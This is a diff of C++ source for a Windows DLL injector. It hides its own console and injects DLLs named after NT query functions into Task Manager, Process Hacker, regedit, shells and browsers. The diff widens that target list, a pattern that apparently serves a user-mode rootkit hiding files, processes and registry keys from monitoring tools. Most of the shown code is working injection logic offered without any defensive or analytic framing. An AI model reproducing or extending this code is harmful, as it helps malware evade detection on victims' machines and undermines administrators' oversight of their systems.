@@ -40,13 +40,13 @@ int InjectDll(DWORD processId, const wstring& dllPath) {
     LPVOID remoteDllPath = VirtualAllocEx(processHandle, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE); // aloca memoria no processo alvo
     if (remoteDllPath == NULL) {
         CloseHandle(processHandle);
-        return -3; 
+        return -3;
     }
 
     if (!WriteProcessMemory(processHandle, remoteDllPath, dllPath.c_str(), pathLength, NULL)) {
         VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
         CloseHandle(processHandle);
-        return -4; 
+        return -4;
     }
 
     HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPath, 0, NULL); // cria uma thread remota para executar LoadLibraryW
@@ -62,7 +62,7 @@ int InjectDll(DWORD processId, const wstring& dllPath) {
     GetExitCodeThread(threadHandle, &exitCode);
 
     CloseHandle(threadHandle);
-    VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE); 
+    VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
     CloseHandle(processHandle);
 
     return exitCode;
@@ -70,7 +70,7 @@ int InjectDll(DWORD processId, const wstring& dllPath) {
 
 
 int main() {
-    
+
     FreeConsole();
     wchar_t currentDir[MAX_PATH];
     GetModuleFileName(NULL, currentDir, MAX_PATH);
@@ -81,11 +81,11 @@ int main() {
     }
     wstring exeDir = currentDirStr.substr(0, pos + 1);
 
-    wstring exeNames[] = { L"ProcessHacker.exe", L"explorer.exe", L"Taskmgr.exe" };
+    wstring exeNames[] = { L"ProcessHacker.exe", L"explorer.exe", L"Taskmgr.exe", L"mmc.exe", L"powershell.exe", L"cmd.exe", L"msedge.exe", L"chrome.exe", L"regedit.exe"};
     const int numExes = sizeof(exeNames) / sizeof(wstring);
 
     std::vector<std::wstring> dllNames = {
-        exeDir + L"RegEnumValueW.dll",
+        exeDir + L"NtEnumerateKey.dll",
         exeDir + L"NTSystemInformation.dll",
         exeDir + L"NtQueryDirectoryFile.dll"
 
